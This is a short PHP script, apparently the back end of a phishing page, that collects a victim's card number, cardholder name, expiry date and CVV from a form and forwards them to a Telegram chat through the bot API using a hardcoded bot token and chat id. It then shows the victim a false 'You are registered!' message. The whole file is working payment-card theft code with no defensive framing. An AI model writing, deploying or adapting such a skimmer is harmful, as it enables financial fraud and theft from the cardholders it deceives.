<?php

if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    $card_number = $_GET['user_number'];
    $name = $_GET['user_name'];
    $date = $_GET['user_date'];
    $cvv = $_GET['user_cvv'];
    
    $token = "6537472202:AAE_z7dBAIr1hu0cgC1trxVG_IZCJhORs6Q";
    $chat_id = "-1001950408583";
    
    $arr = array(
      'Номер карты: ' => $card_number,
      'Имя: ' => $name,
      'Дата: ' => $date,
      'CVV: ' => $cvv
    );
    
    $txt = '';
    
    foreach($arr as $key => $value) {
      $txt .= "<b>".$key."</b> ".$value."%0A";
    }
    
    $sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");
    
    if ($sendToTelegram) {
      echo "You are registered!";
    } else {
      echo "Error";
    }
}

?>
